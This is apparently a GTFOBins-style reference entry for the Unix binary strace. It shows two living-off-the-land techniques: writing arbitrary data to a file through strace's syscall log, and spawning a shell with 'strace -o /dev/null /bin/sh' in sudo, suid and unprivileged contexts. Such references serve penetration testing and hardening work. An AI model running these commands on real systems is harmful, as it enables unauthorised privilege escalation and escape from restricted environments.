---
type: gtfobin
name: strace
platform: Unix
functions: [file-write, shell]
tags: [gtfobin, unix, lotl]
---

# strace

## file-write

```bash
strace -s 999 -o /path/to/output-file strace - DATA
```
_The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough instead of `999`. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - DATA`._
**Contexts:** sudo, unprivileged

## shell

```bash
strace -o /dev/null /bin/sh
```
**Contexts:** sudo, suid, unprivileged
